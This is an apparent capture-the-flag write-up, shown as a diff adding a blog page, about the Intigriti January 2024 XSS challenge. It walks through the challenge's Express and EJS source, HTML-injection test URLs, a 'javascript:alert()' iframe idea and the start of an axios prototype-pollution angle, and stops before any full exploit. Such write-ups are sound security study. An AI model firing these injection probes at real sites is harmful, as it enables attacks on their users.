@@ -1,0 +1,521 @@
+<p>Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p</p>
+
+<p>The source for this challenge was provided: https://challenge-0124.intigriti.io/static/source.zip</p>
+
+<p>The routes are defined in \src\app.js</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">index</span><span class="dl">"</span><span class="p">);</span>
+	<span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">name</span><span class="p">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="p">{</span> <span class="na">SANITIZE_DOM</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}),</span>
+        <span class="na">search</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">search</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
+    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
+	    <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>The two relevant onces are this.</p>
+
+<p>For the first index root, it takes the value from the query parameters <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">search</code> which are passed to the render method. Sanitization is being done on name parameter via dompurify so no easy xss there.</p>
+
+<p>Those parameters values are used in the search.ejs template</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%-</span> <span class="nf">include</span><span class="p">(</span><span class="dl">"</span><span class="s2">inc/header</span><span class="dl">"</span><span class="p">);</span> <span class="o">%&gt;</span>
+<span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Hey</span> <span class="o">&lt;%-</span> <span class="nx">name</span> <span class="o">%&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">Which</span> <span class="nx">repo</span> <span class="nx">are</span> <span class="nx">you</span> <span class="nx">looking</span> <span class="k">for</span><span class="p">?</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
+</span>
+<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;%= search %&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span>
+<span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/img/loading.gif</span><span class="dl">"</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">loading</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">50px</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">homepage</span><span class="dl">"</span> <span class="nx">hidden</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
+</span>
+<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/axios.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/static/js/jquery-3.7.1.min.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+
+        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
+        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">};</span>
+
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+                <span class="p">});</span>
+            <span class="p">};</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>
+
+        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+            <span class="nf">search</span><span class="p">();</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
+</span>
+</code></pre></div></div>
+
+<p>The value from <code class="language-plaintext highlighter-rouge">name</code> parameter (sanitized using dompurify) is placed here:</p>
+
+<pre><code class="language-ejs">&lt;h2&gt;Hey &lt;%- name %&gt;,&lt;br&gt;Which repo are you looking for?&lt;/h2&gt;
+</code></pre>
+
+<p>From ejs docs https://ejs.co/#docs
+<code class="language-plaintext highlighter-rouge">&lt;%-</code> Outputs the unescaped value into the template, so this is clearly a html injection bug (no xss due to use of dompurify)</p>
+
+<pre><code class="language-ejs">&lt;input name="q" value="&lt;%= search %&gt;"&gt;
+</code></pre>
+<p><code class="language-plaintext highlighter-rouge">search</code> parameter value is safe from html injection: <code class="language-plaintext highlighter-rouge">&lt;%=</code> Outputs the value into the template (HTML escaped)</p>
+
+<p>The same can be verified from this url: https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=shirley%22%3E%3Cimg%20src=x%3E
+<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/60261d43-9364-4fa4-9b4c-ca12f575b20d" alt="image" /></p>
+
+<p>Moving on to the script block, it loads two things axios and jquery.The version of jquery is mentioned but axios isn’t.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+
+        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
+        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">};</span>
+
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+                <span class="p">});</span>
+            <span class="p">};</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>
+
+        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+            <span class="nf">search</span><span class="p">();</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+</code></pre></div></div>
+
+<p>Upon window load, it calls the <code class="language-plaintext highlighter-rouge">search</code> method, <code class="language-plaintext highlighter-rouge">params</code> variable contains the value of <em>search</em> query parameter.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
+        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">};</span>
+
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
+            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
+            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+                <span class="p">});</span>
+            <span class="p">};</span>
+        <span class="p">});</span>
+</code></pre></div></div>
+
+<p>Axios is used to make a post request to the search endpoint, the 2nd arguement is <code class="language-plaintext highlighter-rouge">$("#search").get(0)</code> which for some reasons looks weird.
+It stores the response from the search endpoint in <code class="language-plaintext highlighter-rouge">repo</code> variable, if <code class="language-plaintext highlighter-rouge">repo.owner</code> is defined it moves on the next part of code</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
+
+<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="nx">corresponds</span> <span class="nx">to</span> <span class="nx">the</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span> <span class="nx">element</span>
+<span class="nx">It</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">src</span> <span class="nx">attribute</span> <span class="nx">value</span> <span class="kd">with</span> <span class="nx">what</span> <span class="nx">is</span> <span class="k">in</span> <span class="nx">the</span> <span class="s2">`repo.owner.avatar_url`</span> <span class="nx">property</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
+
+<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p&gt; /</span><span class="o">/</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">innerText</span> <span class="nx">property</span> <span class="nx">to</span> <span class="s2">`repo.description`</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+                <span class="p">});</span>
+            <span class="p">};</span>
+</code></pre></div></div>
+
+<p>It checks the value of <code class="language-plaintext highlighter-rouge">repo.homepage</code> if it starts <code class="language-plaintext highlighter-rouge">https://</code> or not. If it does it sets the value to the src attribute of <code class="language-plaintext highlighter-rouge">$("#homepage")</code> element which basically is an iframe</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>This kinda looks promising sink  as if somehow that check can be bypassed (with the help of quirk of this challenge) it would be easy to get xss if it went something like this</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span> <span class="na">src=</span><span class="s">"javascript:alert()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
+    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
+	    <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>It basically searchs for the string provided in q param (search parameter ) and checks if a match is found in repos.json file (check the source)</p>
+
+<p>For eg this loads:
+https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=angular/material-start</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">src=</span><span class="s">"https://angularjs-material-start.web.app"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="axios-prototype-pollution">Axios Prototype Pollution</h1>
+
+<p>As I already said that the 2nd arg kinda look weird.Lets dig into it to see why it’s used that way</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
+        <span class="p">})</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Ok so they are passing full the whole form tag as 2nd arg?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /search HTTP/1.1
+Host: challenge-0124.intigriti.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Content-Type: application/json
+Content-Length: 30
+
+{"q":"angular/material-start"}
+</code></pre></div></div>
+
+<p>Cool, so it somehow converted that form tag to  json format.
+Looking at some examples of axios post calls</p>
+
+<p>https://github.com/axios/axios/blob/6d4c421ee157d93b47f3f9082a7044b1da221461/test/module/typings/cjs/index.ts#L91</p>
+
